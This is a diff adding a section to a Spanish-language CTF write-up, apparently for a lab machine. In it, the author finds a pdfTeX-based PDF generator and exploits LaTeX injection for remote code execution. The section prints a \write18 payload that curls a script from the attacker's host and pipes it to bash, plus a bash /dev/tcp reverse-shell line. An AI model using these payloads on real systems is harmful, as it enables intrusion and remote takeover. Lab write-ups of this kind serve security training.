@@ -160,6 +160,57 @@ Una vez pasado por el decrypt, y decodeado en **base64** obtenemos el siguiente 
 
 ![image](https://user-images.githubusercontent.com/87484792/183443787-8eca67d1-7e84-4621-9358-4ed25a4b5c7a.png)
 
+Obtenemos una nueva ruta y un dominio. Añadiré este dominio a mi `/etc/hosts` y visualizaré el contenido de la web.
+
+El dominio aplica virtual hosting, y podemos visualizar nuevo contenido que antes no veiamos con la ip convencional.
+Aunque no es del todo de ayuda en esta maquina, podemos diferenciar y comprender que a veces el tener un dominio puede contener material de apoyo para nuestro CTF.
+
+![image](https://user-images.githubusercontent.com/87484792/183445285-005e1bf6-6cd9-4210-9bd9-b690c3d52046.png)
+
+Visualicemos ahora sí, la ruta que nos proporcian en el mensaje encriptado.
+
+![image](https://user-images.githubusercontent.com/87484792/183446022-68a7ff39-d18f-46ea-a822-29ec722f1666.png)
+
+Parece un generador de PDF, para cosas como esta me gusta tener activo burpsuite. 
+He hecho otras maquinas, como por ejemplo **RedPanda**, donde el vector de ataque es similar, así que puedo intuir por donde iran los tiros.
+Hagamos una simulación, como que quiero generar un PDF, y veamos el comportamiento del servidor. Mi principal interes será ver si me arroja algún tipo de error, la versión, y que data esta solicitando. 
+
+De primeras sin el burp activado, la pagina parece no hacer nada al hacer click en el botón. 
+Con el burp activo, recibo esta respuesta:
+
+![image](https://user-images.githubusercontent.com/87484792/183447954-ae0f3a12-f854-4bd3-92c6-c7919ecb75f5.png)
+
+Esta respuesta del servidor me da mucha información. 
+
+- El servidor esta utilizando pdfTeX para generar informes PDF.
+- La versión que utiliza es la 3.14
+- El archivo se genera con un nombre aleatorio
+- Se guardan en una nueva ruta desconocida hasta ahora */pdf*
+
+Con una busqueda rápida en Google, encuentro que la versión es vulnerable, permitiendo ejecución remota de comando (RCE).
+`https://0day.work/hacking-with-latex/`
+
+Tras unas cuantas pruebas para obtener ciertos archivos sensibles, encuentro que el servidor tiene un blacklist y bloquea ciertas peticiones, sin embargo esto tambien se contempla en el material de apoyo dado anteriormente. Igualmente, podemos ejecutar comandos sin ningún problema.
+
+RCE code:
+
+```
+\immediate\write18{curl http://10.10.16.2/shell | bash }
+```
+
+En mi maquina atacante:
+
+```
+Contenido de "Shell":
+-	bash -i >& /dev/tcp/10.10.16.2/8081 0>&1
+Python3 Server:
+-	python3 -m http-server 80
+```
+
+Vemos que obtenemos la shell:
+
+![image](https://user-images.githubusercontent.com/87484792/183456745-1598706a-424f-4089-9570-37c48c3ffcb9.png)
+
 
 
 
